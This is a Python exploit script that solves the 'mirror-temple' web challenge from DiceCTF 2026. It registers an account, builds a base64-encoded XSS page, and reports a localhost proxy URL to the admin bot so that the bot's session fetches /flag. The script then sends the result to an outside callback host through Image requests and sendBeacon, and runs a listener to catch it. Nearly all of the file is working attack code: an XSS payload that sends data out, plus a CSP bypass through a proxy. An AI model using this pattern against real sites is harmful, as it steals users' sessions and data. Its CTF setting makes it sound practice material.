#!/usr/bin/env python3
"""
Challenge: mirror-temple
Category:  web
Platform:  DiceCTF 2026

Vulnerability: Admin bot registers at localhost:8080 with the flag in JWT cookie.
Proxy (Charon) bypasses Spring Security + CSP, serving attacker HTML on same origin.
Report localhost proxy URL → admin's cookie is sent → XSS fetches /flag → exfiltrate.
"""
import base64
import sys
import time
import requests
import threading
import http.server
import urllib.parse

# === CONFIGURATION ===
LOCAL_URL = "http://localhost:8080"
REMOTE_URL = sys.argv[1] if len(sys.argv) > 1 else "https://mirror-temple-672869a845a1.ctfi.ng"
CALLBACK_URL = sys.argv[2] if len(sys.argv) > 2 else "https://techno-routing-stored-satisfied.trycloudflare.com"

BASE = REMOTE_URL
session = requests.Session()
session.verify = False

flag_result = []

# === CALLBACK SERVER ===
class CallbackHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        params = urllib.parse.parse_qs(parsed.query)
        if "f" in params:
            flag_result.append(urllib.parse.unquote(params["f"][0]))
            print(f"[+] FLAG: {flag_result[-1]}")
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")

    def do_POST(self):
        cl = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(cl).decode("utf-8", errors="replace")
        if body.startswith("dice{"):
            flag_result.append(body)
            print(f"[+] FLAG (beacon): {body}")
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")

    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "*")
        self.end_headers()

    def log_message(self, fmt, *args):
        pass

# === BUILD XSS PAYLOAD ===
def build_xss():
    html = f'''<html><body><script>
(async()=>{{
try{{
let r=await fetch("/flag");
let f=await r.text();
new Image().src="{CALLBACK_URL}/flag?f="+encodeURIComponent(f);
navigator.sendBeacon("{CALLBACK_URL}/b",f);
}}catch(e){{
new Image().src="{CALLBACK_URL}/err?e="+encodeURIComponent(e.message);
}}
}})();
</script></body></html>'''
    b = base64.urlsafe_b64encode(html.encode()).decode().rstrip("=")
    return f"http://httpbin.org/base64/{b}"

# === EXPLOIT ===
def exploit():
    print(f"[*] Target: {BASE}")
    print(f"[*] Callback: {CALLBACK_URL}")

    # Step 1: Register to get a JWT (needed for /report)
    print("[*] Registering account...")
    r = session.post(f"{BASE}/postcard-from-nyc", data={
        "name": "hacker",
        "portrait": "http://example.com/x.png",
        "flag": "dice{fake}",
    }, allow_redirects=False)
    jwt = r.cookies.get("save")
    if not jwt:
        cookie_header = r.headers.get("Set-Cookie", "")
        jwt = cookie_header.split("save=")[1].split(";")[0] if "save=" in cookie_header else None
    assert jwt, "Failed to get JWT"
    print(f"[+] Got JWT: {jwt[:50]}...")
    session.cookies.set("save", jwt)

    # Step 2: Build XSS payload via httpbin base64
    xss_url = build_xss()
    print(f"[*] XSS URL: {xss_url[:80]}...")

    # Step 3: Report localhost proxy URL to admin bot
    # KEY: use localhost:8080 so admin's cookie (set for localhost) is sent
    report_url = f"http://localhost:8080/proxy?url={xss_url}"
    print(f"[*] Reporting: http://localhost:8080/proxy?url=...")

    r = session.post(f"{BASE}/report", data={"url": report_url})
    print(f"[+] Report response: {r.text}")

    # Step 4: Wait for admin bot
    print("[*] Waiting for admin bot (up to 30s)...")
    for i in range(30):
        time.sleep(1)
        if flag_result:
            break

    if flag_result:
        print(f"\n[+] FLAG: {flag_result[0]}")
    else:
        print("\n[-] No flag received. Check callback server.")

if __name__ == "__main__":
    # Note: This script assumes you have a callback server running at CALLBACK_URL
    # For local testing, start callback_server.py on port 9999 with a tunnel
    exploit()
